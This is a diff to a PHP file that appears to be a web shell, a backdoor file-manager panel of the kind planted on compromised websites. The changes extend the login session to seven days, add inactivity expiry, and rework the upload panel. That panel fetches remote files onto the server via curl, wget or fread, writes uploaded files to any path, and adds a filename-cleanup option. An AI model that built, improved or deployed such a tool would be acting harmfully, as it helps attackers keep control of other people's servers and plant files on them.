@@ -1,5 +1,32 @@
 <?php
+$cookieParams = session_get_cookie_params();
+session_set_cookie_params([
+    'lifetime' => 604800,
+    'path' => $cookieParams['path'],
+    'domain' => $cookieParams['domain'],
+    'secure' => $cookieParams['secure'],
+    'httponly' => true,
+    'samesite' => 'Lax'
+]);
 session_start();
+
+if (isset($_SESSION['f7p_logged_in']) && $_SESSION['f7p_logged_in'] === true) {
+    $last_activity = isset($_SESSION['f7p_last_activity']) ? $_SESSION['f7p_last_activity'] : 0;
+    $inactive_time = 604800;
+    
+    if (time() - $last_activity > $inactive_time) {
+       
+        session_destroy();
+        session_start();
+        $_SESSION = [];
+        session_destroy();
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    }
+    
+   
+    $_SESSION['f7p_last_activity'] = time();
+}
 
 if(isset($_POST['content_encoded']) && !empty($_POST['content_encoded'])) {
     $encoded = $_POST['content_encoded'];
@@ -31,6 +58,7 @@ if (isset($_POST['login_submit'])) {
         if (password_verify($password, ADMIN_PASS_HASH)) {
             $_SESSION['f7p_logged_in'] = true;
             $_SESSION['f7p_login_time'] = time();
+			$_SESSION['f7p_last_activity'] = time();
             header('Location: ' . $_SERVER['PHP_SELF']);
             exit;
         } else {
@@ -1342,47 +1370,56 @@ elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
         }
     }
     ?>
-    <div class="upload-container">
-    
-    
-    <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=upload" class="upload-form">
-        <?php if ($msg_url): ?>
-            <div class="upload-msg <?php echo strpos($msg_url, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
-                <?php echo $msg_url; ?>
-            </div>
-        <?php endif; ?>
-        
-        <div class="upload-row">
-            <div class="upload-input-wrap">
-                <input class="inputz" type="text" name="wurl" placeholder="Upload from URL">
-                <span class="upload-paste-btn" onclick="navigator.clipboard.readText().then(t=>{if(t)this.previousElementSibling.value=t})" title="Paste from clipboard">📋</span>
-            </div>
-            <select name="pilihan" class="upload-select">
-                <option value="wcurl">curl</option>
-                <option value="wwget">wget</option>
-                <option value="wfread">fread</option>
-            </select>
-            <input class="upload-btn-go" type="submit" name="uploadurl" value="Go">
-        </div>
-        <input type="hidden" name="path" value="<?php echo $pwd; ?>">
-    </form>
+<div class="upload-container">
 
-<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form" id="uploadForm">
-    <?php if ($msg_file): ?>
-        <div class="upload-msg <?php echo strpos($msg_file, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
-            <?php echo $msg_file; ?>
+<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=upload" class="upload-form">
+    <?php if ($msg_url): ?>
+        <div class="upload-msg <?php echo strpos($msg_url, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
+            <?php echo $msg_url; ?>
         </div>
     <?php endif; ?>
     
     <div class="upload-row">
-        <input type="file" name="file[]" multiple id="localFileInput" class="upload-file-input" style="display:none;" onchange="this.form.submit();">
+        <div class="upload-input-wrap">
+            <input class="inputz" type="text" name="wurl" placeholder="Upload from URL">
+            <span class="upload-paste-btn" onclick="navigator.clipboard.readText().then(t=>{if(t)this.previousElementSibling.value=t})" title="Paste from clipboard">📋</span>
+        </div>
+        <select name="pilihan" class="upload-select">
+            <option value="wcurl">curl</option>
+            <option value="wwget">wget</option>
+            <option value="wfread">fread</option>
+        </select>
+        <input class="upload-btn-go" type="submit" name="uploadurl" value="Go">
+    </div>
+    <input type="hidden" name="path" value="<?php echo $pwd; ?>">
+</form>
+
+<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form" id="uploadForm">
+    <div id="uploadMsgContainer">
+        <?php if ($msg_file): ?>
+            <div class="upload-msg <?php echo strpos($msg_file, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
+                <?php echo $msg_file; ?>
+            </div>
+        <?php endif; ?>
+    </div>
+    
+    <div class="upload-row">
+        <input type="file" name="file[]" multiple id="localFileInput" class="upload-file-input" style="display:none;">
         <input class="upload-btn-local" type="button" value="📁 Upload from Local" onclick="document.getElementById('localFileInput').click();">
         <span id="localFileCount" class="upload-file-count upload-file-count-local"></span>
     </div>
+    
+    <div style="display:flex;align-items:center;gap:8px;margin-top:6px;padding-top:6px;border-top:1px solid #eee;">
+        <label style="display:flex;align-items:center;gap:4px;font-size:13px;color:#666;cursor:pointer;">
+            <input type="checkbox" id="rmparen" style="width:14px;height:14px;cursor:pointer;">
+            Remove ()
+        </label>
+        <span style="font-size:11px;color:#999;">index (1).html → index.html</span>
+    </div>
+    
     <input type="hidden" name="path" value="<?php echo $pwd; ?>">
     <input type="hidden" name="uploadcomp" value="1">
 </form>
-
 
 <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form upload-form-zip" id="zipForm">
     <?php if ($msg_zip): ?>
@@ -1399,40 +1436,90 @@ elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
     <input type="hidden" name="path" value="<?php echo $pwd; ?>">
     <input type="hidden" name="uploadzip" value="1">
 </form>
-    
+
 </div>
-    <script>
-    (function() {
-        var localInput = document.getElementById('localFileInput');
-        var localCount = document.getElementById('localFileCount');
-        if (localInput && localCount) {
-            localInput.addEventListener('change', function() {
-                var count = this.files.length;
-                if (count > 0) {
-                    localCount.textContent = count + ' file(s)';
-                    localCount.style.color = '#0066cc';
-                } else {
-                    localCount.textContent = '';
-                }
-            });
-        }
-        
-        var zipInput = document.getElementById('zipFileInput');
-        var zipCount = document.getElementById('zipFileCount');
-        if (zipInput && zipCount) {
-            zipInput.addEventListener('change', function() {
-                var file = this.files[0];
-                if (file) {
-                    var size = (file.size / 1024 / 1024).toFixed(2);
-                    zipCount.textContent = file.name + ' (' + size + 'MB)';
-                    zipCount.style.color = '#ff9800';
-                } else {
-                    zipCount.textContent = '';
-                }
-            });
-        }
-    })();
-    </script>
+
+<script>
+(function() {
+    var key = 'f7p_rmparen';
+    var cb = document.getElementById('rmparen');
+    if (cb) {
+        cb.checked = localStorage.getItem(key) === 'true';
+        cb.onchange = function() { localStorage.setItem(key, this.checked ? 'true' : 'false'); };
+    }
+    
+    var inp = document.getElementById('localFileInput');
+    var count = document.getElementById('localFileCount');
+    var form = document.getElementById('uploadForm');
+    var msgContainer = document.getElementById('uploadMsgContainer');
+    
+    if (inp && count && form) {
+        inp.onchange = function() {
+            var total = this.files.length;
+            if (total === 0) { count.textContent = ''; return; }
+            
+            var isChecked = cb ? cb.checked : false;
+            
+            if (!isChecked) {
+                count.textContent = total + ' file(s)';
+                count.style.color = '#0066cc';
+                form.submit();
+                return;
+            }
+            
+            var renamed = 0;
+            var files = [];
+            for (var i = 0; i < this.files.length; i++) {
+                var oldName = this.files[i].name;
+                var newName = oldName.replace(/\s*\([^)]*\)(?=\.\w+$)/g, '');
+                if (oldName !== newName) renamed++;
+                files.push({ file: this.files[i], newName: newName });
+            }
+            
+            count.textContent = total + ' file(s)' + (renamed > 0 ? ' (' + renamed + ' renamed)' : '');
+            count.style.color = '#28a745';
+            
+            var fd = new FormData();
+            fd.append('path', form.querySelector('input[name="path"]').value);
+            fd.append('uploadcomp', '1');
+            
+            for (var j = 0; j < files.length; j++) {
+                var f = files[j].file;
+                var n = files[j].newName;
+                fd.append('file[]', new File([f], n, { type: f.type }));
+            }
+            
+            var btn = form.querySelector('input[type="button"]');
+            if (btn) { btn.disabled = true; btn.value = 'Uploading...'; }
+            
+            fetch(form.action, { method: 'POST', body: fd })
+                .then(function(res) { return res.text(); })
+                .then(function(html) {
+                    var temp = document.createElement('div');
+                    temp.innerHTML = html;
+                    var newMsg = temp.querySelector('.upload-msg');
+                    if (newMsg) {
+                        msgContainer.innerHTML = newMsg.outerHTML;
+                    } else {
+                        var match = html.match(/✅.*?(?=<\/div>|$)/);
+                        if (match) {
+                            msgContainer.innerHTML = '<div class="upload-msg upload-msg-success">' + match[0] + '</div>';
+                        } else {
+                            msgContainer.innerHTML = '<div class="upload-msg upload-msg-success">✅ Upload complete</div>';
+                        }
+                    }
+                    if (btn) { btn.disabled = false; btn.value = '📁 Upload from Local'; }
+                    inp.value = '';
+                    count.textContent = '';
+                })
+                .catch(function() {
+                    msgContainer.innerHTML = '<div class="upload-msg upload-msg-error">❌ Upload failed</div>';
+                    if (btn) { btn.disabled = false; btn.value = '📁 Upload from Local'; }
+                });
+        };
+    }
+})();
+</script>
     
     <?php
 }
